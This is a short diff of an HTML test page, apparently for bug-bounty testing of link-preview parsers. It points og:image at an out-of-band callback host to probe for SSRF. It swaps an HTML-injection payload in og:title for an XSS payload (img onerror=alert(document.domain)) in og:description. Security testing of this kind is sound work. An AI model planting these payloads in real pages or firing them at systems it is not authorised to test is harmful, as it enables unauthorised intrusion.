@@ -4,9 +4,8 @@
     <!-- 1. Проверка на SSRF и получение IP сервера-парсера через картинку -->
     <meta property="og:image" content="https://jcnxiqrzotvqzopexoxwrf8twt5d92xby.oast.fun">
     
-    <!-- 2. Попытка внедрить HTML в заголовок (если сервер плохо фильтрует) -->
-    <meta property="og:title" content="<b>Test</b> <img src='x' onerror='alert(1)'>">
-    
+    <meta property="og:title" content="<u>Test Underline</u> <b>Bold</b>">
+    <meta property="og:description" content="Check this: <img src=x onerror=alert(document.domain)>">
     <title>Bug Bounty Test</title>
 </head>
 <body>
